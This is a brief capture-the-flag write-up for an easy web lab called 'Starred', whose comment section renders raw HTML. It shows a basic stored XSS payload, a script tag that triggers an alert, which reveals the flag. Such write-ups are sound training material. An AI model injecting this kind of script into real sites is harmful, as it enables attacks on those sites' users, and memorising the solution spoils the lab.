---

Name: Starred
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/events/starred
Description: Starred grew out of a small forum and the comment section was bolted on early. Comments are shown exactly as they were typed so people can add a bit of formatting. Nobody thought too hard about what "exactly as typed" allows. 

---

We go to the comment section and post this XSS payload:

```html
<script>alert("Hacked")</script>
```

The flag is revealed after the successful XSS
